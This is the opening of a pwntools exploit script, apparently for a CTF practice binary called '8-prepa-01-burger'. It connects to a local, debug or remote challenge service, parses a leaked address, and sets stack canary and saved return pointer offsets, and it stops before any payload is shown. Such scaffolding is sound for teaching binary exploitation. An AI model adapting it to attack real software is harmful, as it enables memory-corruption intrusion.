#!/usr/bin/env python3
import re

from pwn import *

exe = context.binary = ELF(args.EXE or "8-prepa-01-burger")

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    io = gdb.debug(
        "./8-prepa-01-burger",
        """
        source /home/ryan/.gdbinit-gef.py
        b *main +81 
        continue
        """,
    )
elif args.LOCAL:
    io = process("./8-prepa-01-burger")
else:
    io = remote("cytech.tcdn.casa", 4801)

io.recvuntil(b"at ")
raw = io.recvuntil(b"\n\n", drop=True)
m = re.search(rb"0x[0-9a-fA-F]+", raw)
leak = int(m.group(0), 16)

canary_offset = 15
canary_size = 8
saved_rip_offset = 39
